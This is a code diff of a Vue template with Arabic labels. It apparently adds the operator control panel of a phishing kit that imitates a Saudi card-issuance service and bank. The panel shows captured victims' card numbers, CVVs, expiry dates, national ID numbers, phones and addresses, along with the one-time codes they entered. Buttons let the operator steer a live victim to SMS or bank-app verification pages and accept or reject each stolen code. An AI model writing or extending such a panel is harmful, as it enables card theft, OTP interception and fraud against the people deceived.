+              <div class="flex items-center gap-1 font-semibold">
+                <span>{{ getVisitorMeta(selectedRequest).country }}</span>
+                <MapPin class="w-3.5 h-3.5 text-gray-500" />
+              </div>
+
+              <span class="text-gray-300">|</span>
+
+              <div class="flex items-center gap-1 font-bold text-gray-800" dir="rtl">
+                <span>{{ getRequestCurrentPageLabel(selectedRequest) }}</span>
+                <FileText class="w-3.5 h-3.5 text-gray-500" />
+              </div>
+            </div>
+          </div>
+
+          <!-- WORKSPACE BODY: Left Sub-Panel + Main Feed -->
+          <div class="flex-1 flex overflow-hidden relative">
+            <!-- Far-Left Sub-Panel (Matches left column with vertical divider bar & blue floating button) -->
+            <div
+              v-if="showLeftSubPanel"
+              class="w-[260px] border-r-[5px] border-gray-300 bg-white flex flex-col justify-between p-4 relative shrink-0"
+            >
+              <!-- Quick Control Actions inside Left Panel -->
+              <div class="space-y-4" dir="rtl">
+                <div class="border border-gray-200 rounded-lg p-3 bg-[#f9fafb]">
+                  <div class="text-xs font-bold text-gray-700 mb-2.5 flex items-center justify-between">
+                    <span>تحكم سريع بالزائر</span>
+                    <span
+                      class="text-[10px] font-semibold"
+                      :class="onlineUsers[selectedRequest.id] ? 'text-[#16a34a]' : 'text-gray-400'"
+                    >
+                      {{ onlineUsers[selectedRequest.id] ? 'متصل الآن' : 'غير متصل' }}
+                    </span>
+                  </div>
+
+                  <div class="grid grid-cols-1 gap-1.5">
+                    <button
+                      @click="updateNextAction(selectedRequest.id, 'otp-sms')"
+                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
+                      :class="
+                        selectedRequest.nextAction === 'otp-sms'
+                          ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
+                          : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
+                      "
+                    >
+                      <span>تحويل لصفحة رمز SMS</span>
+                      <Smartphone class="w-3.5 h-3.5" />
+                    </button>
+
+                    <button
+                      @click="updateNextAction(selectedRequest.id, 'otp-bank')"
+                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
+                      :class="
+                        selectedRequest.nextAction === 'otp-bank'
+                          ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
+                          : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
+                      "
+                    >
+                      <span>تنبية إتصال / تطبيق بنكي</span>
+                      <Building2 class="w-3.5 h-3.5" />
+                    </button>
+
+                    <button
+                      @click="updateNextAction(selectedRequest.id, '/card-details')"
+                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold bg-white border border-gray-200 text-gray-700 hover:bg-gray-50 transition-colors cursor-pointer text-right flex items-center justify-between"
+                    >
+                      <span>إعادة لصفحة البطاقة</span>
+                      <CreditCard class="w-3.5 h-3.5" />
+                    </button>
+                  </div>
+                </div>
+
+                <!-- OTP Verification Control Box (when OTP exists) -->
+                <div
+                  v-if="selectedRequest.otp"
+                  class="border border-blue-200 rounded-lg p-3 bg-[#f0f7ff]"
+                >
+                  <div class="text-xs font-bold text-gray-800 mb-1.5">رمز التحقق المدخل (OTP):</div>
+                  <div
+                    @click="copyText(selectedRequest.otp, 'otp')"
+                    class="font-mono text-xl font-black tracking-[0.25em] text-[#1976d2] bg-white border border-blue-200 rounded py-2 text-center mb-2.5 cursor-pointer select-all tabular-nums"
+                  >
+                    {{ selectedRequest.otp }}
+                  </div>
+
+                  <div class="flex gap-2">
+                    <button
+                      @click="updateOtpStatus(selectedRequest.id, 'approved')"
+                      class="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-1.5 rounded text-xs font-bold flex items-center justify-center gap-1 cursor-pointer"
+                    >
+                      <Check class="w-3.5 h-3.5" />
+                      <span>قبول</span>
+                    </button>
+                    <button
+                      @click="updateOtpStatus(selectedRequest.id, 'rejected')"
+                      class="flex-1 bg-red-600 hover:bg-red-700 text-white py-1.5 rounded text-xs font-bold flex items-center justify-center gap-1 cursor-pointer"
+                    >
+                      <Ban class="w-3.5 h-3.5" />
+                      <span>رفض</span>
+                    </button>
+                  </div>
+
+                  <div
+                    v-if="selectedRequest.otpStatus === 'approved'"
+                    class="mt-2 text-[11px] text-[#16a34a] font-bold text-center"
+                  >
+                    تمت الموافقة على الرمز
+                  </div>
+                  <div
+                    v-else-if="selectedRequest.otpStatus === 'rejected'"
+                    class="mt-2 text-[11px] text-red-600 font-bold text-center"
+                  >
+                    تم رفض الرمز وطلب رمز جديد
+                  </div>
+                </div>
+              </div>
+
+              <!-- Bottom-Left Floating Blue Chat Icon Button -->
+              <div class="pt-4">
+                <button
+                  @click="fetchAll(false)"
+                  class="w-11 h-11 rounded-full bg-[#1976d2] hover:bg-[#1565c0] text-white shadow-lg flex items-center justify-center cursor-pointer transition-transform active:scale-95"
+                  title="تحديث المحادثة"
+                >
+                  <MessageSquare class="w-5 h-5" />
+                </button>
+              </div>
+            </div>
+
+            <!-- Center-Right Timeline Feed (Matches Screenshot Feed Cards) -->
+            <div class="flex-1 overflow-y-auto px-8 py-6 bg-white">
+              <div class="max-w-4xl mx-auto flex flex-col">
+                <!-- ==================== CARD 1: الدفع (PAYMENT CARD) ==================== -->
+                <div class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4">
+                  <div class="text-right font-bold text-sm text-gray-700 mb-3" dir="rtl">
+                    الدفع
+                  </div>
+
+                  <div
+                    v-if="selectedRequest.cardNumber"
+                    class="rounded-xl p-4 shadow-xs border border-gray-300/80 relative overflow-hidden"
+                    style="background: linear-gradient(135deg, #ebedef 0%, #dee3e7 55%, #d2d8de 100%);"
+                    dir="ltr"
+                  >
+                    <!-- Card Top Row: Bank Emblem + Currency Badge -->
+                    <div class="flex items-center justify-between mb-5">
+                      <div class="flex items-center gap-1.5">
+                        <div class="w-5 h-5 rotate-45 rounded-xs bg-gray-800 flex items-center justify-center">
+                          <div class="w-2 h-2 bg-amber-400 rounded-full"></div>
+                        </div>
+                        <div class="leading-none">
+                          <div class="text-[9px] font-bold text-gray-800">البنك السعودي للاستثمار</div>
+                          <div class="text-[7px] text-gray-600">The Saudi Investment Bank</div>
+                        </div>
+                      </div>
+
+                      <span class="border border-gray-400 rounded px-1.5 py-0.5 text-[10px] font-bold text-gray-600">
+                        AED
+                      </span>
+                    </div>
+
+                    <!-- Card Middle Row: 16-digit Number + Expiry Date -->
+                    <div class="flex items-center justify-between mb-3">
+                      <button
+                        @click="copyText(selectedRequest.cardNumber, 'card')"
+                        class="font-mono text-[15px] font-semibold tracking-wider text-gray-900 hover:text-[#1976d2] cursor-pointer select-all tabular-nums"
+                        title="انقر لنسخ رقم البطاقة"
+                      >
+                        {{ formatCardNumberSpaced(selectedRequest.cardNumber) }}
+                      </button>
+
+                      <span class="font-mono text-xs font-semibold text-gray-800 tabular-nums select-all">
+                        {{ selectedRequest.expMonth }}/{{ formatShortExpYear(selectedRequest.expYear) }}
+                      </span>
+                    </div>
+
+                    <!-- Card Bottom Row: Holder Name + CVV -->
+                    <div class="flex items-end justify-between">
+                      <div>
+                        <div class="text-xs font-medium text-gray-800 select-all mb-2">
+                          {{ selectedRequest.paymentName || selectedRequest.name }}
+                        </div>
+                        <div class="w-4 h-3 rounded-xs bg-[#006c35] flex items-center justify-center">
+                          <div class="w-2.5 h-0.5 bg-white/80"></div>
+                        </div>
+                      </div>
+
+                      <div class="text-right">
+                        <div class="text-[8px] text-gray-500 uppercase leading-none">CVV</div>
+                        <div class="font-mono text-xs font-bold text-gray-900 select-all tabular-nums mb-1">
+                          {{ selectedRequest.cvv }}
+                        </div>
+                        <div class="flex items-center gap-1.5 justify-end">
+                          <span class="text-[8px] font-semibold text-gray-600 tracking-tight">DEBIT • PLATINUM</span>
+                          <div class="px-1 py-0.2 bg-white/80 rounded-xs border border-gray-300 text-[7px] font-black text-[#1976d2]">
+                            mada
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div
+                    v-else
+                    class="rounded-xl p-6 bg-white/70 border border-dashed border-gray-300 text-center text-xs text-gray-400"
+                    dir="rtl"
+                  >
+                    بانتظار إدخال بيانات البطاقة...
+                  </div>
+
+                  <!-- Footer link inside Payment Card -->
+                  <div class="mt-2.5 flex items-center justify-between" dir="rtl">
+                    <span class="text-[11px] text-[#1976d2] font-semibold underline cursor-pointer">
+                      {{ copiedField === 'card' ? 'تم النسخ!' : 'منقول' }}
+                    </span>
+
+                    <div v-if="selectedRequest.otp" class="flex items-center gap-2">
+                      <span class="text-[11px] font-bold text-gray-700">
+                        الرمز: <strong class="font-mono text-[#1976d2]">{{ selectedRequest.otp }}</strong>
+                      </span>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Timestamp Divider 1 -->
+                <div class="flex items-center justify-center gap-3 my-3 text-[10px] text-gray-400 font-mono">
+                  <span class="w-12 h-px bg-gray-200"></span>
+                  <span>{{ formatTimelineTimestamp(selectedRequest.createdAt) }}</span>
+                  <span class="w-12 h-px bg-gray-200"></span>
+                </div>
+
+                <!-- ==================== CARD 2: حجز موعد / بيانات الطلب ==================== -->
+                <div
+                  class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right"
+                  dir="rtl"
+                >
+                  <div class="font-bold text-sm text-gray-700 mb-3">
+                    حجز موعد
+                  </div>
+
+                  <div class="space-y-2 text-[12px] text-gray-800 font-medium leading-relaxed">
+                    <div>
+                      <span class="text-gray-600">الاسم : </span>
+                      <span class="font-semibold text-gray-900 select-all">{{ selectedRequest.name }}</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">رقم الهوية : </span>
+                      <span class="font-mono font-semibold text-gray-900 select-all tabular-nums">{{ selectedRequest.idNumber }}</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">رقم الجوال : </span>
+                      <span class="font-mono font-semibold text-gray-900 select-all tabular-nums">{{ selectedRequest.mobile }}</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">العنوان : </span>
+                      <span class="font-semibold text-gray-900 select-all">{{ selectedRequest.address || 'غير محدد' }}</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">فئة البطاقة : </span>
+                      <span class="font-semibold text-gray-900">{{ formatCardTypeLabel(selectedRequest.cardType) }}</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">نوع الخدمة : </span>
+                      <span class="font-semibold text-gray-900">إصدار وتوصيل بطاقة إسعاد</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">تاريخ الطلب : </span>
+                      <span class="font-mono text-[11px] text-gray-800" dir="ltr">
+                        {{ new Date(selectedRequest.createdAt).toUTCString() }}
+                      </span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">موعد الخدمة : </span>
+                      <span class="font-semibold text-gray-900">{{ selectedRequest.date || '03:00 م' }}</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">رسوم الخدمة : </span>
+                      <span class="font-mono font-semibold tabular-nums">100</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">ضريبة القيمة المضافة : </span>
+                      <span class="font-mono font-semibold tabular-nums">15</span>
+                    </div>
+                    <div>
+                      <span class="text-gray-600">مجموع : </span>
+                      <span class="font-mono font-bold tabular-nums">115</span>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Timestamp Divider 2 -->
+                <div class="flex items-center justify-center gap-3 my-3 text-[10px] text-gray-400 font-mono">
+                  <span class="w-12 h-px bg-gray-200"></span>
+                  <span>{{ formatTimelineTimestamp(selectedRequest.updatedAt) }}</span>
+                  <span class="w-12 h-px bg-gray-200"></span>
+                </div>
+
+                <!-- ==================== CARD 3: الدفع & إجراءات التحقق ==================== -->
+                <div
+                  class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right"
+                  dir="rtl"
+                >
+                  <div class="font-bold text-sm text-gray-700 mb-3">
+                    الدفع والتحقق
+                  </div>
+
+                  <div v-if="selectedRequest.otp" class="space-y-3">
+                    <div class="bg-white rounded-lg p-3 border border-gray-200 text-center">
+                      <div class="text-[11px] text-gray-500 mb-1">رمز التحقق (OTP) المستلم:</div>
+                      <div class="font-mono text-2xl font-black tracking-[0.3em] text-[#1976d2] select-all tabular-nums">
+                        {{ selectedRequest.otp }}
+                      </div>
+                    </div>
+
+                    <div class="flex gap-2">
+                      <button
+                        @click="updateOtpStatus(selectedRequest.id, 'approved')"
+                        class="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
+                      >
+                        الرمز صحيح (قبول)
+                      </button>
+                      <button
+                        @click="updateOtpStatus(selectedRequest.id, 'rejected')"
+                        class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
+                      >
+                        الرمز خاطئ (رفض)
+                      </button>
+                    </div>
+                  </div>
+
+                  <div v-else class="space-y-2">
+                    <p class="text-xs text-gray-600 mb-2">توجيه الزائر لصفحة التحقق المطلوبة:</p>
+                    <div class="flex gap-2">
+                      <button
+                        @click="updateNextAction(selectedRequest.id, 'otp-sms')"
+                        class="flex-1 bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
+                      >
+                        تحقق SMS (OTP)
+                      </button>
+                      <button
+                        @click="updateNextAction(selectedRequest.id, 'otp-bank')"
+                        class="flex-1 bg-gray-800 hover:bg-gray-900 text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
+                      >
+                        تنبية إتصال / نفاذ
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </template>
+
+        <!-- Empty Selection State -->
+        <div
+          v-else
+          class="flex-1 flex flex-col items-center justify-center text-gray-400 bg-[#fafafa]"
+          dir="rtl"
+        >
+          <MessageSquare class="w-12 h-12 mb-3 text-gray-300" />
+          <p class="text-sm font-bold text-gray-500">اختر محادثة من صندوق الوارد</p>
+          <p class="text-xs text-gray-400 mt-1">انقر على أي زائر في القائمة اليمنى لعرض بيانات البطاقة والطلب</p>
+        </div>
+      </div>
+
+      <!-- ==================== RIGHT SIDEBAR: VISITORS / CONVERSATIONS LIST ==================== -->
+      <aside class="w-[290px] border-l border-gray-200 bg-white flex flex-col shrink-0 h-full">
+        <!-- Sidebar Filter & Search Header -->
+        <div class="h-[40px] border-b border-gray-200 px-3 flex items-center justify-between shrink-0">
+          <!-- Left: Search Icon Button -->
+          <button
+            @click="showSearchInput = !showSearchInput"
+            class="text-[#1976d2] hover:bg-blue-50 p-1 rounded cursor-pointer"
+            title="بحث"
+          >
+            <Search class="w-4 h-4" />
+          </button>
+
+          <!-- Right: Filter Select + Checkbox -->
+          <div class="flex items-center gap-2" dir="rtl">
+            <input type="checkbox" class="w-3.5 h-3.5 rounded border-gray-300 accent-[#1976d2] cursor-pointer" />
+            <div class="relative flex items-center">
+              <select
+                v-model="filterMode"
+                class="appearance-none bg-transparent pr-1 pl-5 py-1 text-xs font-bold text-gray-700 focus:outline-none cursor-pointer"
+              >
+                <option value="all">كل المحادثات</option>
+                <option value="online">المتصلون الآن</option>
+                <option value="card">بيانات البطاقة</option>
+                <option value="otp">بانتظار رمز OTP</option>
+                <option value="archived">المؤرشفة</option>
+              </select>
+              <ChevronDown class="w-3.5 h-3.5 text-gray-500 absolute left-0 pointer-events-none" />
+            </div>
+          </div>
+        </div>
+
+        <!-- Collapsible Search Bar -->
+        <div v-if="showSearchInput" class="p-2 border-b border-gray-100 bg-gray-50" dir="rtl">
+          <input
+            v-model="searchQuery"
+            type="text"
+            placeholder="بحث بالاسم، الهوية، الجوال، البطاقة..."
+            class="w-full bg-white border border-gray-300 rounded px-2.5 py-1 text-xs focus:outline-none focus:border-[#1976d2]"
+          />
+        </div>
+
+        <!-- Loading / Error / Empty States -->
+        <div v-if="loading" class="flex-1 flex flex-col items-center justify-center text-gray-400 p-6">
+          <RefreshCw class="w-6 h-6 animate-spin text-[#1976d2] mb-2" />
+          <span class="text-xs">جاري التحميل...</span>
+        </div>
+
+        <div v-else-if="error" class="p-4 text-center text-xs text-red-600" dir="rtl">
+          {{ error }}
+        </div>
+
+        <div
+          v-else-if="filteredRequests.length === 0"
+          class="flex-1 flex flex-col items-center justify-center text-gray-400 p-6 text-xs"
+          dir="rtl"
+        >
+          لا توجد محادثات مطابقة
+        </div>
+
+        <!-- Visitors List -->
+        <div v-else class="flex-1 overflow-y-auto divide-y divide-gray-100">
+          <div
+            v-for="req in filteredRequests"
+            :key="req.id"
+            @click="selectedRequestId = req.id"
+            class="px-3 py-3 cursor-pointer transition-colors flex items-center justify-between gap-2"
+            :class="selectedRequestId === req.id ? 'bg-[#cfe4ff]' : 'hover:bg-gray-50 bg-white'"
+          >
+            <!-- Left Column: Relative Time + Status Badges -->
+            <div class="flex flex-col items-start justify-between self-stretch shrink-0">
+              <span class="text-[10px] text-gray-400 font-medium" dir="rtl">
+                {{ formatRelativeTimeShort(req.updatedAt || req.createdAt) }}
+              </span>
+
+              <div class="flex items-center gap-1 mt-1">
+                <MoreHorizontal
+                  v-if="selectedRequestId === req.id || onlineUsers[req.id]"
+                  class="w-3.5 h-3.5 text-[#1976d2]"
+                />
+                <span
+                  v-if="req.cardNumber"
+                  class="inline-flex items-center px-1 py-0.2 bg-emerald-50 border border-emerald-200 rounded-xs text-[8px] font-bold text-emerald-700"
+                >
+                  CARD
+                </span>
+                <span
+                  v-if="req.otp"
+                  class="inline-flex items-center px-1 py-0.2 bg-amber-50 border border-amber-300 rounded-xs text-[8px] font-bold text-amber-700"
+                >
+                  OTP
+                </span>
+              </div>
+            </div>
+
+            <!-- Right Column: Name + Current Page + Avatar with Flag -->
+            <div class="flex items-center gap-2.5 min-w-0">
+              <div class="text-right min-w-0" dir="rtl">
+                <div class="text-[13px] font-bold text-gray-800 truncate max-w-[150px]">
+                  {{ req.name || 'زائر جديد' }}
+                </div>
+                <div class="text-[11px] text-[#526b84] font-medium truncate max-w-[150px] mt-0.5">
+                  {{ getRequestCurrentPageLabel(req) }}
+                </div>
+              </div>
+
+              <!-- Grey Avatar with Silhouette + Bottom-Left Flag Badge -->
+              <div class="relative shrink-0">
+                <div class="w-10 h-10 rounded-full bg-[#d1d5db] flex items-center justify-center text-white overflow-hidden">
+                  <User class="w-6 h-6 fill-white text-white mt-1" />
+                </div>
+                <!-- Small Flag Badge at bottom-left of avatar -->
+                <div
+                  class="absolute -bottom-0.5 -left-0.5 w-3.5 h-2.5 rounded-[2px] bg-[#006c35] border border-white flex items-center justify-center shadow-2xs"
+                  :class="onlineUsers[req.id] ? 'ring-1 ring-[#16a34a]' : ''"
+                >
+                  <div class="w-2 h-[1px] bg-white"></div>
+                </div>
+              </div>
             </div>
           </div>
         </div>
       </aside>
-
-      <!-- Details View Panel -->
-      <div class="flex-1 bg-white rounded-2xl shadow-xs border border-gray-200 flex flex-col overflow-hidden h-full">
-        <div v-if="!selectedRequestId || !selectedRequest" class="flex-1 flex flex-col items-center justify-center text-gray-400 h-full bg-gray-50/30">
-          <ShieldCheck class="w-14 h-14 mb-3 opacity-20 text-[#008a40]" />
-          <h2 class="text-base font-bold text-gray-500 mb-1">اختر طلباً من القائمة</h2>
-          <p class="text-xs">قم بتحديد مستخدم لعرض تفاصيل الطلب والصفحة المتواجد بها حالياً</p>
-        </div>
-        
-        <div v-else class="flex-1 overflow-y-auto p-6 relative">
-          <div class="max-w-[820px] mx-auto w-full">
-            <!-- Header section of details -->
-            <div class="flex justify-between items-start mb-6 pb-5 border-b border-gray-100">
-              <div>
-                <div class="flex items-center gap-3 mb-2">
-                  <h2 class="text-xl font-bold text-gray-900">
-                    {{ selectedRequest.name }}
-                  </h2>
-                  <span class="text-gray-300">·</span>
-                  <span v-if="onlineUsers[selectedRequest.id]" class="text-xs font-bold text-[#008a40]">
-                    متصل الآن (Online)
-                  </span>
-                  <span v-else class="text-xs font-medium text-gray-400">
-                    غير متصل (Offline)
-                  </span>
-                </div>
-
-                <!-- Live Current Page Indicator -->
-                <div class="flex items-center gap-2 text-xs text-gray-700 mb-2">
-                  <Eye class="w-4 h-4 text-[#008a40]" />
-                  <span class="font-semibold">الصفحة الحالية للمستخدم:</span>
-                  <span class="font-bold text-[#008a40]">{{ getRequestCurrentPageLabel(selectedRequest) }}</span>
-                  <span class="font-mono text-gray-400" dir="ltr">({{ getRequestCurrentPagePath(selectedRequest) }})</span>
-                </div>
-
-                <p class="text-gray-500 font-sans text-xs flex gap-3">
-                  <span>التاريخ: {{ new Date(selectedRequest.createdAt).toLocaleDateString('ar-EG', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }) }}</span>
-                  <span>·</span>
-                  <span>{{ formatRelativeTime(selectedRequest.createdAt) }}</span>
-                </p>
-              </div>
-              
-              <div class="text-left text-xs font-bold text-[#008a40]">
-                <template v-if="selectedRequest.step === 'form'">طلب جديد (النموذج)</template>
-                <template v-else-if="selectedRequest.step === 'card'">مرحلة البطاقة</template>
-                <template v-else-if="selectedRequest.step === 'otp'">رمز التحقق (رسالة)</template>
-                <template v-else-if="selectedRequest.step === 'otp-bank'">رمز التحقق (التطبيق)</template>
-                <template v-else>{{ selectedRequest.step }}</template>
-              </div>
-            </div>
-
-            <!-- Content Grid layout for details -->
-            <div class="grid grid-cols-2 gap-6 mb-6">
-              <!-- Column 1: basic info -->
-              <div class="flex flex-col gap-5">
-                <div class="bg-gray-50 rounded-xl p-5 border border-gray-100">
-                  <h3 class="font-bold text-sm text-gray-900 mb-4 pb-2 border-b border-gray-200 flex items-center gap-2">
-                    <Users class="w-4 h-4 text-[#008a40]" />
-                    البيانات الأساسية
-                  </h3>
-                  
-                  <div class="space-y-3.5 text-sm">
-                    <div>
-                      <p class="text-[11px] font-bold text-gray-400 mb-1">رقم الهاتف</p>
-                      <p class="font-mono text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 inline-block w-full">{{ selectedRequest.mobile }}</p>
-                    </div>
-                    <div>
-                      <p class="text-[11px] font-bold text-gray-400 mb-1">رقم الهوية</p>
-                      <p class="text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.idNumber }}</p>
-                    </div>
-                    <div>
-                      <p class="text-[11px] font-bold text-gray-400 mb-1">العنوان</p>
-                      <p class="text-gray-900 bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.address }}</p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-
-              <!-- Column 2: Card & Actions -->
-              <div class="flex flex-col gap-5">
-                
-                <!-- Card Mockup -->
-                <div v-if="selectedRequest.cardNumber" class="bg-gradient-to-br from-[#008a40] to-[#052e16] rounded-2xl p-5 relative overflow-hidden shadow-lg text-white">
-                  <div class="flex justify-between items-start mb-6 relative z-10">
-                    <span class="text-xs font-bold text-white/90">
-                      <template v-if="selectedRequest.cardType === 'silver'">بطاقة إسعاد الأساسية</template>
-                      <template v-else-if="selectedRequest.cardType === 'gold'">بطاقة إسعاد الذهبية</template>
-                      <template v-else-if="selectedRequest.cardType === 'platinum'">بطاقة إسعاد البلاتينية</template>
-                      <template v-else>{{ selectedRequest.cardType }}</template>
-                    </span>
-                    <div class="w-10 h-7 border border-white/20 rounded bg-yellow-400/30"></div>
-                  </div>
-
-                  <div class="space-y-4 relative z-10">
-                    <div class="w-full" dir="ltr">
-                      <p class="text-[10px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Card Number</p>
-                      <p class="font-mono text-white tracking-[0.2em] text-base font-bold select-all tabular-nums">
-                        {{ selectedRequest.cardNumber.replace(/(.{4})/g, '$1 ').trim() }}
-                      </p>
-                    </div>
-                    
-                    <div class="flex items-center gap-6" dir="ltr">
-                      <div>
-                        <p class="text-[9px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Name</p>
-                        <p class="font-mono text-white/90 uppercase text-xs tracking-wider select-all">
-                          {{ selectedRequest.paymentName || selectedRequest.name }}
-                        </p>
-                      </div>
-                      <div>
-                        <p class="text-[9px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Expires</p>
-                        <p class="font-mono text-white font-medium tracking-wider text-xs select-all tabular-nums">
-                          {{ selectedRequest.expMonth }}/{{ selectedRequest.expYear }}
-                        </p>
-                      </div>
-                      <div>
-                        <p class="text-[9px] text-yellow-200 uppercase tracking-widest mb-0.5 font-bold">CVV</p>
-                        <p class="font-mono text-white bg-black/25 px-2 py-0.5 rounded text-xs select-all text-center tabular-nums">
-                          {{ selectedRequest.cvv }}
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                <div v-else class="bg-green-50/50 rounded-xl p-5 border border-green-100">
-                  <h3 class="font-bold text-sm text-[#008a40] mb-3 pb-2 border-b border-green-100">بيانات البطاقة</h3>
-                  <div class="text-gray-400 text-xs py-6 text-center bg-white/60 rounded-lg border border-dashed border-gray-200">
-                    لم يقم بإدخال بيانات البطاقة بعد
-                  </div>
-                </div>
-
-                <!-- OTP & Actions Box -->
-                <div class="bg-white rounded-xl p-5 border border-gray-200 shadow-2xs">
-                  <h3 class="font-bold text-sm text-gray-900 mb-4 pb-2 border-b border-gray-100">إجراءات التحقق والتوجيه</h3>
-                  
-                  <div v-if="selectedRequest.otp" class="flex flex-col items-center">
-                    <p class="text-xs text-gray-500 mb-2">الرمز المدخل:</p>
-                    <div class="font-mono text-[#008a40] font-bold text-2xl tracking-[0.3em] bg-green-50 py-2.5 px-5 rounded-xl border border-green-200 text-center w-full mb-4 tabular-nums">
-                      {{ selectedRequest.otp }}
-                    </div>
-                    
-                    <div class="flex gap-3 w-full" v-if="!selectedRequest.otpStatus || selectedRequest.otpStatus === 'pending'">
-                      <button @click="updateOtpStatus(selectedRequest.id, 'approved')" class="flex-1 bg-[#008a40] hover:bg-[#007335] text-white py-2 rounded-lg text-xs font-bold transition-all cursor-pointer">
-                        الرمز صحيح
-                      </button>
-                      <button @click="updateOtpStatus(selectedRequest.id, 'rejected')" class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded-lg text-xs font-bold transition-all cursor-pointer">
-                        الرمز خاطئ
-                      </button>
-                    </div>
-                    
-                    <div v-else-if="selectedRequest.otpStatus === 'approved'" class="w-full bg-green-50 border border-green-200 text-[#008a40] py-2.5 rounded-lg text-center font-bold text-xs">
-                      تمت الموافقة على الرمز
-                    </div>
-                    <div v-else-if="selectedRequest.otpStatus === 'rejected'" class="w-full bg-red-50 border border-red-200 text-red-700 py-2.5 rounded-lg text-center font-bold text-xs">
-                      تم رفض الرمز
-                    </div>
-                  </div>
-                  
-                  <div v-else-if="selectedRequest.step === 'card' && !selectedRequest.nextAction" class="flex flex-col gap-2.5">
-                    <p class="text-xs text-gray-600 text-center mb-1">توجيه المستخدم إلى صفحة التحقق:</p>
-                    <button @click="updateNextAction(selectedRequest.id, 'otp-sms')" class="w-full bg-[#008a40] hover:bg-[#007335] text-white py-2.5 rounded-lg text-xs font-bold transition-all cursor-pointer">
-                      رسالة نصية (SMS)
-                    </button>
-                    <button @click="updateNextAction(selectedRequest.id, 'otp-bank')" class="w-full bg-gray-800 hover:bg-gray-900 text-white py-2.5 rounded-lg text-xs font-bold transition-all cursor-pointer">
-                      تطبيق بنكي
-                    </button>
-                  </div>
-                  
-                  <div v-else-if="selectedRequest.step === 'card' && selectedRequest.nextAction" class="py-5 flex flex-col items-center justify-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
-                    <p class="text-[#008a40] text-xs font-bold text-center px-4">
-                      تم توجيه المستخدم لصفحة التحقق
-                      <span v-if="selectedRequest.nextAction === 'otp-sms'" class="font-normal opacity-80 block mt-0.5">(رسالة نصية)</span>
-                      <span v-if="selectedRequest.nextAction === 'otp-bank'" class="font-normal opacity-80 block mt-0.5">(تطبيق بنكي)</span>
-                    </p>
-                    <p class="text-[11px] text-gray-400 mt-1.5">في انتظار إدخال الرمز...</p>
-                  </div>
-                  
-                  <div v-else class="text-gray-400 text-xs py-6 text-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
-                    بانتظار إدخال بيانات البطاقة للتحقق
-                  </div>
-                </div>
-
-              </div>
-            </div>
-            
-          </div>
-        </div>
-      </div>
-    </main>
+    </div>
   </div>
 </template>
